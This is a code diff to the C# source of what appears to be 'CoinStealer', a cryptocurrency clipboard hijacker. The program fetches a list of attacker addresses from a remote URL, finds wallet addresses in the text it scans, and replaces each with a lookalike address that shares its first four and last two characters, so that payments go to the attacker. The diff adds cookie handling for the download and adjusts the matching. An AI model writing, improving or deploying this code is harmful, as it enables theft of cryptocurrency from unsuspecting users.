@@ -18,13 +18,41 @@ namespace CoinPayload
         /// </summary>
         static Dictionary<string, string> Changes = new Dictionary<string, string>();
 
+        class HttpHandler : WebClient
+        {
+            CookieContainer _mContainer = new CookieContainer();
+
+            protected override WebRequest GetWebRequest(Uri address)
+            {
+                var request = base.GetWebRequest(address);
+                if (request is HttpWebRequest h)
+                {
+                    h.AllowAutoRedirect = true;
+                    h.CookieContainer = _mContainer;
+                }
+                return request;
+            }
+
+            protected override WebResponse GetWebResponse(WebRequest request)
+            {
+                var response = base.GetWebResponse(request);
+                if (response is HttpWebResponse h)
+                {
+                    _mContainer.Add(h.Cookies);
+                }
+                return response;
+            }
+
+            public void ClearCookies() { _mContainer = new CookieContainer(); }
+        }
+
         [STAThread]
         static void Main(string[] args)
         {
 #if DEBUG
             if (Debugger.IsAttached)
             {
-                args = new string[] { "https://raw.githubusercontent.com/shargon/CoinStealer/master/Samples/Addresses.txt?token=ADBW5Q7v31YTdQ8wlotdsdV93juszUEmks5aM6pJwA%3D%3D" };
+                args = new string[] { "https://github.com/shargon/CoinStealer/blob/master/CoinStealer/Samples/Addresses.txt?raw=true" };
             }
 #endif
             // Check parameter
@@ -32,7 +60,7 @@ namespace CoinPayload
             if (!Uri.TryCreate(args[0], UriKind.RelativeOrAbsolute, out Uri uri)) return;
 
             // Download address list
-            using (WebClient wb = new WebClient())
+            using (HttpHandler wb = new HttpHandler())
             {
                 foreach (string dir in wb.DownloadString(uri).Split(new char[] { '\n', '\r' }, StringSplitOptions.RemoveEmptyEntries))
                     try
@@ -66,7 +94,7 @@ namespace CoinPayload
             // Search address path
             foreach (Match m in Pattern.Matches(t))
             {
-                string sub = m.Value.Substring(0, 4) + m.Value.Substring(m.Value.Length - 2, 2);
+                string sub = m.Value.Substring(0, 4) + m.Value.Substring(m.Value.Length - 2, 2).ToLowerInvariant();
 
                 // Search my replacement :)
                 if (Changes.TryGetValue(sub, out string sc) && sc != m.Value)
